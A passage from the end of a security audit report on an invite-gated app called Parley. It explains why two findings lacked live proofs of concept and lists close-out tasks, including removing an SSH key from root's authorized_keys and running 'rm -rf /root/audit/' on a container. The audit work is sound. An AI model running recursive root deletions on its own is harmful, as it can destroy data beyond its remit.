- **No test accounts created** — Parley registration is invite-gated (`internal/auth/service.go:99-101`); none of the agents obtained an invite. This means the live-end-to-end PoC for F-impersonation-claim and F-theme-validator was not executed; both are source-grade confirmed and cf-scout's header-pass-through PoC + `dmz-injector-2`'s compromised-DMZ PoC end-to-end confirm the feeder layers.

### To close out
- [ ] (Owner decision) Seed invite codes for the audit team to run live PoCs of F-impersonation-claim and F-theme-validator?
- [ ] Remove aegis-dev pubkey from `/root/.ssh/authorized_keys` on CT 106.
- [ ] `rm -rf /root/audit/` on CT 106.
- [ ] Commit this report (if approved).
